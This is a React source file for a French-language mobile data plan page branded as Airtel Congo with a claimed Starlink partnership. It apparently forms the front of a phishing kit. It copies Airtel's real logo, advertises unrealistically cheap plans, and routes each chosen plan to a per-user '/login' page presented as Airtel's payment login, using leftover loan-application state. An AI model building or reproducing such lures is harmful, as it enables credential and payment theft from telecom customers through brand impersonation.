import { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLoanApplication } from '../LoanApplicationContext';
import { useUserId } from '../hooks/useUserId';
import './Dataplans.css';

const PLANS = [
  { id: 'starter', data: '1 GB', dataValue: 1, unit: 'GB', price: 0.19, validity: '1 Jour', badge: null, highlight: true, speed: '4G' },
  { id: 'basic', data: '3 GB', dataValue: 3, unit: 'GB', price: 0.39, validity: '3 Jours', badge: null, highlight: false, speed: '4G' },
  { id: 'standard', data: '7 GB', dataValue: 7, unit: 'GB', price: 0.79, validity: '7 Jours', badge: null, highlight: false, speed: '4G' },
  { id: 'popular', data: '15 GB', dataValue: 15, unit: 'GB', price: 1.49, validity: '7 Jours', badge: '⚡ Populaire', highlight: false, speed: '4G' },
  { id: 'pro', data: '30 GB', dataValue: 30, unit: 'GB', price: 2.99, validity: '21 Jours', badge: '💎 Pro', highlight: false, speed: '4G+' },
  { id: 'max', data: '50 GB', dataValue: 50, unit: 'GB', price: 5.49, validity: '30 Jours', badge: '🚀 Max', highlight: false, speed: '4G+' },
  { id: 'unlimited', data: 'Illimité', dataValue: '∞', unit: 'Illimité', price: 7.49, validity: '30 Jours', badge: '👑 Illimité', highlight: false, speed: '4G+', unlimited: true, wide: true },
];

export default function DataPlans() {
  const navigate = useNavigate();
  const { userId } = useUserId();
  const { selectDataPlan } = useLoanApplication();
  const [selected, setSelected] = useState(null);
  const [animating, setAnimating] = useState(null);

  const handleSelect = (plan) => {
    setAnimating(plan.id);
    setSelected(plan.id);
    setTimeout(() => {
      selectDataPlan(plan);
      navigate(`/${userId}/login`);
    }, 600);
  };

  return (
    <div className="dp-root">
      <div className="dp-blob dp-blob-1" />
      <div className="dp-blob dp-blob-2" />
      <div className="dp-blob dp-blob-3" />

      <header className="dp-header">
        <div className="dp-logo-wrap">
          <img src="https://cdn-webportal.airtelstream.net/website/zambia/assets/images/logo.svg" alt="Airtel" className="dp-logo" />
        </div>
        <div className="dp-collab-center">
          <span className="dp-collab-text">En collaboration avec</span>
          <div className="dp-collab-brand">
            <span className="dp-starlink-wordmark">STARLINK</span>
            <img src="Starlink_Logo.svg" alt="Starlink" className="dp-starlink-logo" />
          </div>
        </div>
        <button className="dp-menu-btn"><span /><span /><span /></button>
      </header>

      <main className="dp-main">
        <div className="dp-hero">
          <div className="dp-hero-badge">📶 Forfaits Internet</div>
          <h1 className="dp-hero-title">Restez Connecté<br /><span className="dp-hero-accent">Sans Limites</span></h1>
          <p className="dp-hero-sub">Choisissez un forfait. Vous serez redirigé vers la page de connexion Airtel Lite pour procéder au paiement.</p>
        </div>

        <div className="dp-grid">
          {PLANS.map((plan) => (
            <button key={plan.id}
              className={`dp-card ${plan.highlight ? 'dp-card--hot' : ''} ${plan.wide ? 'dp-card--wide' : ''} ${selected === plan.id ? 'dp-card--selected' : ''} ${animating === plan.id ? 'dp-card--animating' : ''}`}
              onClick={() => handleSelect(plan)}>
              {plan.badge && <div className="dp-badge">{plan.badge}</div>}
              <div className="dp-card-speed">{plan.speed}</div>
              <div className="dp-card-data">
                <span className={`dp-card-amount ${plan.unlimited ? 'dp-card-amount--infinity' : typeof plan.dataValue === 'string' ? 'dp-card-amount--text' : ''}`}>
                  {plan.dataValue}
                </span>
                {!plan.unlimited && <span className="dp-card-unit">{plan.unit}</span>}
              </div>
              <div className="dp-card-validity">Valide {plan.validity}</div>
              <div className="dp-card-divider" />
              <div className="dp-card-price">
                <span className="dp-card-currency">$</span>
                <span className="dp-card-dollars">{plan.price.toFixed(2)}</span>
              </div>
              <div className={`dp-card-cta ${plan.highlight ? 'dp-card-cta--hot' : ''}`}>
                {animating === plan.id ? '✓ Sélectionné' : 'Choisir ce forfait'}
              </div>
            </button>
          ))}
        </div>

        <div className="dp-trust">
          <div className="dp-trust-item"><span>⚡</span> Activation instantanée</div>
          <div className="dp-trust-sep" />
          <div className="dp-trust-item"><span>🔒</span> Paiement sécurisé</div>
          <div className="dp-trust-sep" />
          <div className="dp-trust-item"><span>📞</span> Support 24/7</div>
        </div>
      </main>

      <footer className="dp-footer">© 2026 Airtel Congo. Tous droits réservés.</footer>
    </div>
  );
}
